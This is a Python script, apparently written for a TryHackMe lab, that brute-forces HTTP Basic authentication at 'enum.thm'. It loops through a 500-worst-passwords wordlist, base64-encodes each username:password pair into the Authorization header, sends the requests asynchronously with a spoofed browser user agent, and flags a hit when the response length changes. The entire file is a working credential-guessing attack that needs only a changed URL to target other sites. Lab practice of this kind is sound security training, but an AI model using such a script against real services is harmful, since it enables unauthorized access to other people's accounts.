import base64
import sys
import os
import aiohttp
import asyncio
async def check_pass(username):

 url = 'http://enum.thm/labs/basic_auth/'

 wordlist = os.path.join(os.getcwd(), "500-worst-passwords.txt")
   
 with open(wordlist, 'r',encoding='utf-8') as file:
        passwords = file.readlines()

 previous_response_length=0
 async with aiohttp.ClientSession() as session: 
  for password in passwords :
     password=password.strip()

     userpass=f"{username}:{password}"
     b64=base64.b64encode(userpass.encode()).decode()

     header={
     'Host': 'enum.thm',
     'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
     'Accept-Language': 'en-US,en;q=0.5',
     'Accept-Encoding': 'gzip, deflate, br',
     'Connection': 'keep-alive',
     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     'X-Requested-With': 'XMLHttpRequest',
     'Referer': 'http://enum.thm/labs/basic_auth/',
     'Authorization': f'Basic {b64}'
     }
     async with session.post(url, headers=header) as response:
      response_txt=await response.text()
      response_length = len(response_txt)
      print(f"triedpasswords:{password},responselength:{response_length}")
      if response_length != previous_response_length and previous_response_length != 0:
         print(f"password found:{password}")
         break 
      previous_response_length = response_length
    

if __name__ == "__main__":
   asyncio.run(check_pass(sys.argv[1]))



